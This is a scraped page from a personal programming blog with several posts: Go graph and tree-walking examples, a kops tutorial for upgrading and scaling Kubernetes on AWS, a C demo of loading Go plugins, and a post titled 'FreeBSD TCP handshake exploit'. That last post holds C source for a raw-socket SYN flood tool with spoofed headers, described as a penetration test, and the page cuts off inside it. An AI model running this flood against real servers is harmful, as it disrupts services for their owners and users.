		d.Processors = append(d.Processors, &amp;p)
		p.Function = Process
		go p.Exec()
	}
	d.TotalOperations = (d.TotalVertices * d.Iterations) - d.Iterations + 1 //Math is hard
	fmt.Printf(&quot;Total Vertices              : %d\n&quot;, d.TotalVertices)
	fmt.Printf(&quot;Total Iterations            : %d\n&quot;, d.Iterations)
	fmt.Printf(&quot;Total Concurrent Processors : %d\n&quot;, noProcs)
	fmt.Printf(&quot;Total Assumed Operations    : %d\n&quot;, d.TotalOperations)
}

func (d *DiGraph) Crawl() {
	d.ProcessedChannel = make(chan int)
	go d.RootVertex.recursiveProcess(d.getProcessor().Channel)
	fmt.Printf(&quot;---\n&quot;)
	for d.ProcessedCount &lt; d.TotalOperations {
		d.ProcessedCount += &lt;-d.ProcessedChannel
                //o(fmt.Sprintf(&quot;%d &quot;, d.ProcessedCount))
	}
	fmt.Printf(&quot;\n---\n&quot;)
	fmt.Printf(&quot;Total Comlpeted Operations  : %d\n&quot;, d.ProcessedCount)
}

func (d *DiGraph) getProcessor() *Processor {
	maxIndex := len(d.Processors) - 1
	if d.ProcessorIndex == maxIndex {
		d.ProcessorIndex = 0
	} else {
		d.ProcessorIndex += 1
	}
	return d.Processors[d.ProcessorIndex]
}

func Process(v *Vertex) int {

	// Simulate some work with a random sleep
	rand.Seed(time.Now().Unix())
	sleep := rand.Intn(100 - 0) + 100
	time.Sleep(time.Millisecond * time.Duration(sleep))

        o(fmt.Sprintf(&quot;Processing: %s&quot;, v.Name))
	// Return a status code
	return 1
}

func (v *Vertex) recursiveProcess(ch chan *Vertex) {
	ch &lt;- v
	for _, e := range v.Edges {
		if e.ProcessedCount &lt; TheGraph.Iterations {
			e.ProcessedCount += 1
			go e.To.recursiveProcess(TheGraph.getProcessor().Channel)
		}
	}
}

func (v *Vertex) recursiveCount() int {
	i := 1
	for _, e := range v.Edges {
		if e.ProcessedCount != 0 {
			e.ProcessedCount = 0
			i += e.To.recursiveCount()
		}
	}
	return i
}

func (v *Vertex) AddVertex(name string) *Vertex {
	newVertex := &amp;Vertex{Name: name}
	newEdge := &amp;Edge{To: newVertex, From: v, ProcessedCount: -1}
	newVertex.Edges = append(newVertex.Edges, newEdge)
	v.Edges = append(v.Edges, newEdge)
	return newVertex
}

func (p *Processor) Exec() {
	for {
		v := &lt;-p.Channel
		v.Status = p.Function(v)
		TheGraph.ProcessedChannel &lt;- 1
	}
}

func NewGraph() *DiGraph {
	rootVertex := &amp;Vertex{Name: &quot;0&quot;}
	v1 := rootVertex.AddVertex(&quot;1&quot;)
	rootVertex.AddVertex(&quot;2&quot;)
	rootVertex.AddVertex(&quot;3&quot;)
	v1.AddVertex(&quot;1-1&quot;)
	v1.AddVertex(&quot;1-2&quot;)
	v1_3 := v1.AddVertex(&quot;1-3&quot;)
	v1_3.AddVertex(&quot;1-3-1&quot;)
	v1_3.AddVertex(&quot;1-3-2&quot;)
	v1_3_3 := v1_3.AddVertex(&quot;1-3-3&quot;)
	v1_3_3.AddVertex(&quot;1-3-3-1&quot;)
	v1_3_3.AddVertex(&quot;1-3-3-2&quot;)
	v1_3_3.AddVertex(&quot;1-3-3-3&quot;)
	v1_3_3.AddVertex(&quot;1-3-3-4&quot;)
	v1_3_3.AddVertex(&quot;1-3-3-5&quot;)
	v1_3_3.AddVertex(&quot;1-3-3-6&quot;)
	v1_3_3.AddVertex(&quot;1-3-3-7&quot;)
	graph := &amp;DiGraph{}
	graph.RootVertex = rootVertex
	return graph
}

func o(str string) {
	fmt.Println(str)
}

</pre>
<h4>Try it out</h4>
<p>You can run the code yourself in the <a href="https://play.golang.org/p/BPxRzh-J-W" target="_blank">Go playground</a>.</p>
<h4>Thanks!</h4>
<p>Thank you for reading my article. As always, I appreciate any feedback from users. So let me know how we could be better.</p>
<p><a class="github-button" href="https://github.com/kris-nova" data-style="mega" data-count-href="/kris-nova/followers" data-count-api="/users/kris-nova#followers" data-count-aria-label="# followers on GitHub">Follow @kris-nova</a></p>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-220" class="post-220 post type-post status-publish format-standard hentry category-go tag-computer-science tag-crawl tag-cs tag-graph tag-list tag-root tag-tree tag-tree-walker tag-walk tag-walker">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=220.html">Single rooted tree in Go</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=220.html" rel="bookmark"><time class="entry-date published" datetime="2017-03-20T01:25:36+00:00">March 20, 2017</time><time class="updated" datetime="2017-03-20T14:12:30+00:00">March 20, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=220.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><h4>Problem</h4>
<p>Given 2 arbitrary integers X and N construct a tree such that the root has X child nodes, and each of the root&#8217;s children has N child nodes. Walk the graph touching each node only once and tracking the distance of each node from the root of the tree. For every node that has children, the parent node MUST BE visited first.</p>
<p>The total number of node visitations should match the following formula:</p>
<pre class="brush: plain; title: ; notranslate" title="">

T = (X * N) + X + 1

</pre>
<h4>Solution</h4>
<pre class="brush: golang; title: ; notranslate" title="">
package main

import (
	&quot;fmt&quot;
)

// main will build and walk the tree
func main() {
	fmt.Println(&quot;Building Tree&quot;)
	root := buildTree()
	fmt.Println(&quot;Walking Tree&quot;)
	root.walk()

}

// Total is a fun way to total how many nodes we have visited
var total = 1

// How many children for the root to thave
const rootsChildren = 3

// How many children for the root's children to have
const childrenChildren = 10

// node is a super simple node struct that will form the tree
type node struct {
	parent   *node
	children []*node
	depth    int
}

// buildTree will construct the tree for walking.
func buildTree() *node {
	var root &amp;node
	root.addChildren(rootsChildren)
	for _, child := range root.children {
		child.addChildren(childrenChildren)
	}
	return root
}

// addChildren is a convenience to add an arbitrary number of children
func (n *node) addChildren(count int) {
	for i := 0; i &lt; count; i++ {
		newChild := &amp;node{
			parent: n,
			depth:  n.depth + 1,
		}
		n.children = append(n.children, newChild)
	}
}

// walk is a recursive function that calls itself for every child
func (n *node) walk() {
	n.visit()
	for _, child := range n.children {
		child.walk()
	}
}

// visit will get called on every node in the tree.
func (n *node) visit() {
	d := &quot;â””&quot;
	for i := 0; i &lt;= n.depth; i++ {
		d = d + &quot;â”€â”€â”€&quot;
	}
	fmt.Printf(&quot;%s Visiting node with address %p and parent %p Total (%d)\n&quot;, d, n, n.parent, total)
	total = total + 1
}
</pre>
<p>&nbsp;</p>
<h4>Execution Output</h4>
<pre>
</pre>
<pre><span class="stdout">Building Tree
Walking Tree
â””â”€â”€â”€ Visiting node with address 0x104401a0 and parent 0x0 Total (1)
â””â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104401c0 and parent 0x104401a0 Total (2)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440220 and parent 0x104401c0 Total (3)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440240 and parent 0x104401c0 Total (4)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440260 and parent 0x104401c0 Total (5)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440280 and parent 0x104401c0 Total (6)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104402a0 and parent 0x104401c0 Total (7)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104402e0 and parent 0x104401c0 Total (8)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440300 and parent 0x104401c0 Total (9)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440320 and parent 0x104401c0 Total (10)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440340 and parent 0x104401c0 Total (11)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440360 and parent 0x104401c0 Total (12)
â””â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104401e0 and parent 0x104401a0 Total (13)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440380 and parent 0x104401e0 Total (14)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104403a0 and parent 0x104401e0 Total (15)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104403c0 and parent 0x104401e0 Total (16)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104403e0 and parent 0x104401e0 Total (17)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440400 and parent 0x104401e0 Total (18)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440440 and parent 0x104401e0 Total (19)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440460 and parent 0x104401e0 Total (20)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440480 and parent 0x104401e0 Total (21)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104404a0 and parent 0x104401e0 Total (22)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104404c0 and parent 0x104401e0 Total (23)
â””â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440200 and parent 0x104401a0 Total (24)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104404e0 and parent 0x10440200 Total (25)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440500 and parent 0x10440200 Total (26)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440520 and parent 0x10440200 Total (27)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440540 and parent 0x10440200 Total (28)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440560 and parent 0x10440200 Total (29)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104405a0 and parent 0x10440200 Total (30)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104405c0 and parent 0x10440200 Total (31)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x104405e0 and parent 0x10440200 Total (32)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440600 and parent 0x10440200 Total (33)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Visiting node with address 0x10440620 and parent 0x10440200 Total (34)
</span></pre>
<h4>Try it out</h4>
<p>You can run the code yourself in the <a href="https://play.golang.org/p/r2N1V2FvOZ">Go playground</a>.</p>
<h4>Thanks!</h4>
<p>Thank you for reading my article. As always, I appreciate any feedback from users. So let me know how we could be better.</p>
<p><a class="github-button" href="https://github.com/kris-nova" data-style="mega" data-count-href="/kris-nova/followers" data-count-api="/users/kris-nova#followers" data-count-aria-label="# followers on GitHub">Follow @kris-nova</a></p>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-174" class="post-174 post type-post status-publish format-standard has-post-thumbnail hentry category-k8s">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	   
		<img width="600" height="339" src="../../../../wp-content/uploads/2016/12/kubernetes-thumb.png" class="attachment-full size-full wp-post-image" alt="" srcset="../../../../wp-content/uploads/2016/12/kubernetes-thumb.png 600w, ../../../../wp-content/uploads/2016/12/kubernetes-thumb-300x170.png 300w" sizes="(max-width: 600px) 100vw, 600px" />	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=174.html">Your 2nd day with Kubernetes on AWS</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=174.html" rel="bookmark"><time class="entry-date published" datetime="2017-03-02T05:47:03+00:00">March 2, 2017</time><time class="updated" datetime="2017-03-20T01:28:32+00:00">March 20, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=174.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><h1>Your 2nd day with Kubernetes on AWS</h1>
<p>Okay, so you have a cluster up and running on AWS. Now what? Seriously, managing a Kubernetes cluster is hard. Especially if you are even thinking about keeping up with the pace of the community. The good news, is that <code>kops</code> makes this easy. Here a few commonly used stories on how to manage a cluster after everything is already up and running. If there is something you don&#8217;t see, that you would like, please let me know!</p>
<p>This tutorial assumes you were able to<a href="../../../../setting-up-a-kubernetes-cluster-in-aws-with-kops-1-5-0/index.html"> successfully get a cluster up and running in AWS</a>, and you are now ready to see what else it can do.</p>
<p>In this tutorial we are covering 2nd day concerns for managing a Kubernetes cluster on AWS. The idea of this tutorial is toÂ exercise some useful bits of <code>kops</code>Â functionality that you won&#8217;t see during a cluster deployment. Here weÂ <strong>really</strong> open up <code>kops</code> to see what she can do (yes, <code>kops</code>Â is a girl)</p>
<p>In this tutorial we will be running <code>kops</code>Â 1.5.1, which can be <a href="https://github.com/kubernetes/kops/releases/tag/1.5.1">downloaded here</a>.</p>
<p>We will also be making the assumption that you have an environment setup similar to the following.</p>
<pre class="brush: plain; title: ; notranslate" title="">
export NAME=nextday.nivenly.com
export KOPS_STATE_STORE=s3://nivenly-com-state-store
</pre>
<h1>Upgrading Kubernetes with kops</h1>
<p>Suppose you are running an older version of Kubernetes, and want to run the latest and greatest..</p>
<p>Here we will start off with a <code>Kubernetes v1.4.8</code>Â cluster. We are picking an older cluster here to demonstrate the workflow in which you could upgrade your Kubernetes cluster. The project evolves quickly, and you want to be able to iterate on your clusters just as quickly. To deploy a <code>Kubernetes v1.4.8</code> cluster:</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops create cluster --zones us-west-2a --kubernetes-version 1.4.8 $KOPS_NAME --yes
</pre>
<p>As the cluster is deploying, notice how <code>kops</code> will conveniently remind us that the version of Kubernetes that we are deploying is outdated. This is by design. We really want users to know when they are running old code.</p>
<pre class="brush: plain; title: ; notranslate" title="">
..snip
A new kubernetes version is available: 1.5.2
Upgrading is recommended (try kops upgrade cluster)
..snip
</pre>
<p>So now we have an older version of Kubernetes running. We know this by running the following command and looking for <code>Server Version: version.Info</code></p>
<pre class="brush: plain; title: ; notranslate" title="">
kubectl version
</pre>
<p>Now, we can use the following command to see what <code>kops</code>Â suggests we should do:</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops upgrade cluster $KOPS_NAME
</pre>
<p>We can safely append <code>--yes</code> to the end of our command to apply the upgrade to our configuration. But what is really happening here?</p>
<p>When we run the upgrade command as in</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops upgrade cluster $KOPS_NAME --yes
</pre>
<p>all we are really doing is appending some values to the <strong>cluster spec</strong>. (Remember, this is the <strong>state store</strong> that is stored in S3 in YAML). Which of course can always be accessed and edited using:</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops edit cluster $KOPS_NAME
</pre>
<p>In this case you will notice how the <code>kops upgrade cluster</code> command conveniently changed the following line in the configuration file for us.</p>
<pre class="brush: plain; title: ; notranslate" title="">
  kubernetesVersion: 1.5.2
</pre>
<p>We can now run a <code>kops update cluster</code> command as we always would, to apply the change.</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops update cluster $KOPS_NAME --yes
</pre>
<p>We can now safely roll each of our nodes to finish the upgrade. Let&#8217;s use <code>kops rolling-update cluster</code>Â to re deploy each of our nodes. This is necessary to finish the upgrade. A kops rolling update will cycle each of the instance in the autoscale group with the new configuration.</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops rolling-update cluster $KOPS_NAME --yes
</pre>
<p>We can now check the version of Kubernetes, and validate that we are in fact using the latest version.</p>
<pre class="brush: plain; title: ; notranslate" title=""> kubectl version </pre>
<p>Note: If a specific version of Kubernetes is desired, you can always use the <code>--channel</code> flag and specify a valid channel. An example channel can be found <a href="https://github.com/kubernetes/kops/blob/master/channels/stable">here</a>.</p>
<h1>Scaling your cluster</h1>
<p>Suppose you would like to scale your cluster to process more work..</p>
<p>In this example we will start off with a very basic cluster, and turn the node count up using kops instance groups.</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops create cluster --zones us-west-2a --node-count 3 $KOPS_NAME --yes
</pre>
<p>After the cluster is deployed we can validate that we are using 3 nodes by running</p>
<pre class="brush: plain; title: ; notranslate" title="">
kubectl get nodes
</pre>
<p>Say we want to scale our nodes from 3 to 30. We can easily do that with kops by editing the <code>nodes</code>Â instance group using:</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops edit instancegroup nodes
</pre>
<p>We can then bump our node counts up to 30</p>
<pre class="brush: plain; title: ; notranslate" title="">
spec:
  image: kope.io/k8s-1.4-debian-jessie-amd64-hvm-ebs-2016-10-21
  machineType: t2.medium
  maxSize: 30
  minSize: 30
  role: Node
  subnets:
  - us-west-2a
</pre>
<p>We then of course need to update our newly edited configuration</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops update cluster $KOPS_NAME --yes
</pre>
<p><a href="../../../../wp-content/uploads/2017/03/Screen-Shot-2017-03-01-at-10.36.30-PM.png"><img class="alignright wp-image-197 " src="http://www.nivenly.com/wp-content/uploads/2017/03/Screen-Shot-2017-03-01-at-10.36.30-PM-300x203.png" alt="screen-shot-2017-03-01-at-10-36-30-pm" width="524" height="356" srcset="../../../../wp-content/uploads/2017/03/Screen-Shot-2017-03-01-at-10.36.30-PM-300x203.png 300w, ../../../../wp-content/uploads/2017/03/Screen-Shot-2017-03-01-at-10.36.30-PM-768x521.png 768w, ../../../../wp-content/uploads/2017/03/Screen-Shot-2017-03-01-at-10.36.30-PM-1024x694.png 1024w" sizes="(max-width: 524px) 100vw, 524px" /></a></p>
<p>Kops will update the AWS ASG automatically, andÂ <strong>poof</strong> we have a 30 node cluster.</p>
<p>I do actually try all of this before recommending it to anyone. So yes, I was able to actually deploy a 30 node cluster in AWS with kops.</p>
<p>The cluster was deployed successfully, and the primary component of lag was waiting on Amazon to deploy the instances after detecting a change in the Autoscaling group.</p>
<p>&nbsp;</p>
<p>A quick delete command from kops, and all is well.</p>
<pre class="brush: plain; title: ; notranslate" title=""> kops delete cluster $KOPS_NAME --yes </pre>
<h1>Audit your clusters</h1>
<p>Suppose you need to know what is going on in the cloud.. and audit your infrastructure..</p>
<p>By designÂ <code>kops</code> will never store information about the cloud resources, and will always look them up at runtime. So gaining a glimpse into what you have running currently can be a bit of a concern. There are 2 <code>kops</code>Â commands that are very useful for auditing your environment, and also auditing a single cluster.</p>
<p>In order to see what clusters we have running in a state store we first use the following command:</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops get clusters
</pre>
<p>Notice how we no longer have to use `$KOPS_NAME`. This is because we already have a cluster deployed, and thus should already have a working `~/.kube/config` file in place. We can infer a lot of information from the file. Now that we have a cluster name (or more!) in mind, we can use the following command:</p>
<pre class="brush: plain; title: ; notranslate" title="">
kops toolbox dump
</pre>
<p>Which will output all the wonderful information we could want about a cluster in a format that is easy to query. It is important to note that the resources defined here are discovered using the same cluster lookup methods `kops` uses for all other cluster commands. This is a raw, and unique output of your cluster at runtime!</p>
<h3>Thanks!</h3>
<p>Thank you for reading my article. As always, I appreciate any feedback from users. So let me know how we could be better. Also feel free to check me out on GitHub for more kops updates.</p>
<p><a class="github-button" href="https://github.com/kris-nova" data-style="mega" data-count-href="/kris-nova/followers" data-count-api="/users/kris-nova#followers" data-count-aria-label="# followers on GitHub">Follow @kris-nova</a></p>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-190" class="post-190 post type-post status-publish format-standard hentry category-c category-go">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=190.html">Plugins in Go 1.8 and their underlying C implementation.</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=190.html" rel="bookmark"><time class="entry-date published" datetime="2017-03-02T04:43:03+00:00">March 2, 2017</time><time class="updated" datetime="2017-08-16T16:30:48+00:00">August 16, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=190.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><p>I wrote a writeup on the C implementation of Go plugins in Go 1.8 with a proof of concept code, and examples on how to demonstrate the functionality.</p>
<p>The original project can be found <a href="https://github.com/kris-nova/go-plugin-demo" target="_blank" rel="noopener">here</a>.</p>
<pre class="brush: cpp; title: ; notranslate" title="">
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;dlfcn.h&gt;

int main(int argc, char **argv) {
    void *handle;
    void (*run)();
    char *error;

    handle = dlopen (&quot;../plugins/plugin1.so&quot;, RTLD_LAZY);
    if (!handle) {
        fputs (dlerror(), stderr);
        printf(&quot;\n&quot;);
        exit(1);
    }

    run = dlsym(handle, &quot;plugin/unnamed-4dc81edc69e27be0c67b8f6c72a541e65358fd88.init&quot;);
    if ((error = dlerror()) != NULL)  {
        fputs(error, stderr);
        printf(&quot;\n&quot;);
        exit(1);
    }

    (*run)();
    dlclose(handle);
}
</pre>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-188" class="post-188 post type-post status-publish format-standard hentry category-c category-unix">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=188.html">FreeBSD TCP handshake exploit</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=188.html" rel="bookmark"><time class="entry-date published" datetime="2017-03-02T04:39:26+00:00">March 2, 2017</time><time class="updated" datetime="2017-08-16T16:30:33+00:00">August 16, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=188.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><p>I have worked on exploiting a TCP handshake vulnerability using native FreeBSD C libraries.</p>
<p>The original project can be found <a href="https://github.com/kris-nova/SYN-spoof" target="_blank" rel="noopener">here</a>.</p>
<pre class="brush: cpp; title: ; notranslate" title="">
/*
 * ============================================================================
 *
 * (c)2002-2014. Kris Nova. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *=============================================================================
 *
 * sdos.c
 *
 * Tested and compiled on FreeBSD 10+
 *
 * A simple C script to attempt to flood a server with SYN requests in the
 * hopes of determining the threshold for availability.
 *
 * This is an isolated penetration test that will send requests via a unique
 * thread.
 *=============================================================================
 */

/* Includes */
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;errno.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;time.h&gt;

/* Interface */
int main(int argc, char *argv[]);
unsigned short csum(unsigned short *ptr, int nbytes);
void usage();
int flood();
char* randIp();

/**
 * configuration
 *
 * The basic information for defining where we will send the pen request
 */
struct configuration
{
	char *ip;
	char *message;
	int port;
	int verbose;
};

/**
 * main
 *
 * Handles argument parsing and building the configuration struct
 *
 * int argc The total amount of arguments passed
 * char *argv[] Array of arguments space dilimited
 */
int main(int argc, char *argv[])
{
	//Set defaults
	struct configuration cfg;
	cfg.ip = &quot;127.0.0.1&quot;;
	cfg.port = 1234;
	cfg.message = &quot;...&quot;;
	cfg.verbose = 0;

	//Define
	unsigned int seed;
	unsigned int ii;

	// Invalid command, display usage
	int i;
	if (argc &lt;= 2)
	{
		usage();
		exit(0);
	}

	// Parse arguments
	for (i = 0; i &lt; argc; i++)
	{
		if (argv[i][0] == '-')
		{
			switch (argv[i][1])
			{
			case 'v':
				//Verbose
				cfg.verbose = 1;
				break;
			case 'h':
				//Host
				cfg.ip = argv[i + 1];
				break;
			case 'p':
				//Port
				cfg.port = atoi(argv[i + 1]);
				break;
			case 'm':
				//Message
				cfg.message = argv[i + 1];
				break;
			}
		}
	}
	//Call flood with our configuration
	seed = time(NULL);
	ii = 0;
	while (flood(cfg))
	{
		seed++;
		ii++;
		srand(seed);
		printf(&quot;Iterations: %i\n&quot;, ii);
	}
	//Fin
	return 1;
}

/**
 * csum
 *
 * Used to calculate the checksum
 */
unsigned short csum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;
	sum = 0;
	while (nbytes &gt; 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1)
	{
		oddbyte = 0;
		*((u_char*) &amp;oddbyte) = *(u_char*) ptr;
		sum += oddbyte;
	}
	sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
	sum = sum + (sum &gt;&gt; 16);
	answer = (short) ~sum;
	return (answer);
}

/**
 * flood
 *
 * The main function for the test
 * Handles sending the packets to the server in test
 */
int flood(struct configuration *cfg)
{
	//Create a raw socket
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	//Datagram to represent the packet
	char datagram[4096], source_ip[32];
	//IP header
	struct ip *iph = (struct ip *) datagram;
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
	//Socket
	struct sockaddr_in sin;
	//Spoof struct (for calculation the checksum)
	struct ippseudo ipps;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	//TODO random IP
	sin.sin_addr.s_addr = inet_addr(randIp());

	//Zero out the buffer
	memset(datagram, 0, 4096);

	//IP header
	iph-&gt;ip_hl = 5;
	iph-&gt;ip_v = 4;
	iph-&gt;ip_tos = 0;
	iph-&gt;ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph-&gt;ip_id = htons(54321);
	iph-&gt;ip_off = 0;
	iph-&gt;ip_ttl = 255;
	iph-&gt;ip_p = IPPROTO_TCP;
	iph-&gt;ip_sum = 0;
	struct in_addr ipsrc;
	ipsrc.s_addr = inet_addr(source_ip);
	iph-&gt;ip_src = ipsrc;
	struct in_addr ipdst;
	ipdst.s_addr = sin.sin_addr.s_addr;
	iph-&gt;ip_dst = ipdst;
	iph-&gt;ip_sum = csum((unsigned short *) datagram, iph-&gt;ip_len &gt;&gt; 1);

	//TCP Header
	tcph-&gt;th_sport = htons(1234);
	tcph-&gt;th_dport = htons(80);
	tcph-&gt;th_seq = 0;
	tcph-&gt;th_ack = 0;
	//First and only TCP segment
	tcph-&gt;th_off = 5;
	tcph-&gt;th_flags = 00000010;
	//Max window size
	tcph-&gt;th_win = htons(5840);
	//The kernel will handle calculation this
	tcph-&gt;th_sum = 0;
	tcph-&gt;th_urp = 0;

	//Spoof struct
	struct in_addr spfsrc;
	spfsrc.s_addr = inet_addr(source_ip);
	ipps.ippseudo_src = spfsrc;
	struct in_addr spfdst;
	spfdst.s_addr = sin.sin_addr.s_addr;
	ipps.ippseudo_dst = spfdst;
	ipps.ippseudo_pad = 0;
	ipps.ippseudo_p = IPPROTO_TCP;
	ipps.ippseudo_len = htons(20);

	//Calculate checksum for the TCP header
	tcph-&gt;th_sum = csum((unsigned short*) &amp;ipps, sizeof(struct ippseudo));

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &amp;one;
	if (setsockopt(s, IPPROTO_IP, PF_INET, val, sizeof(one)) &lt; 0)
	{
		printf(&quot;Error setting IP_HDRINCL. &quot;
				&quot;Error number : %d . &quot;
				&quot;Error message : %s \n&quot;,
		errno, strerror(errno));
		exit(0);
	}

	//Send the packet
	if (sendto(s, /* our socket */
	datagram, /* the buffer containing headers and data */
	iph-&gt;ip_len, /* total length of our datagram */
	0, /* routing flags, normally always 0 */
	(struct sockaddr *) &amp;sin, /* socket addr, just like in */
	sizeof(sin)) &lt; 0) /* a normal send() */
